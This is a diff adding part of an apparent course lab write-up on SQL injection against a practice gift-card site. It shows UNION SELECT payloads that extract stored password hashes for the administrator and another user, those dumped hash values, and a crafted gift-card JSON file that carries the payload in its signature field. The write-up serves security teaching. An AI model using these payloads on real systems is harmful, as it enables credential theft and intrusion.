@@ -145,3 +145,28 @@ We are being asked for the password dat of the user in the session and the admin
 
 <img width="1043" alt="Screen Shot 2022-03-20 at 9 57 13 PM" src="https://user-images.githubusercontent.com/72175659/159196953-b193f52c-470b-47e6-8063-37d408f41a56.png">
 
+password data for administrator is 000000000000000000000000000078d2$18821d89de11ab18488fdc0a01f1ddf4d290e198b0f80cd4974fc031dc2615a3
+password data for johnbg is 000000000000000000000000000078d2$fd9536f6310de320d67bed983a102591d708ba497eebd1084c4f4cf91b0345a8
+
+a statement that could work is a UNION SELECT since our data needs to be appended after the queries already programmed
+we try 
+```
+'UNION SELECT password FROM Legacysite_user WHERE username='johnbg' --
+
+```
+<img width="1131" alt="Screen Shot 2022-03-20 at 10 51 02 PM" src="https://user-images.githubusercontent.com/72175659/159199263-39ddb2fe-8c9c-4d49-beb6-2b44935ee4d9.png">
+<img width="1133" alt="Screen Shot 2022-03-20 at 10 51 14 PM" src="https://user-images.githubusercontent.com/72175659/159199265-c25beb03-8d25-4aed-a3d3-df05fef1e137.png">
+We find the password data in the output 
+
+we try 
+```
+'UNION SELECT password FROM Legacysite_user WHERE username='administrator' --
+
+```
+<img width="1143" alt="Screen Shot 2022-03-20 at 10 55 20 PM" src="https://user-images.githubusercontent.com/72175659/159199507-31505b32-2043-48c9-b439-e432dde546e0.png">
+the following payload is in our jbg469-sqli.gftcrd file
+```
+{"merchant_id": "NYU Apparel Card", "customer_id": "gullible_user", "total_value": "10", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "'UNION SELECT password FROM Legacysite_user WHERE username='administrator' --"}]}
+```
+
+
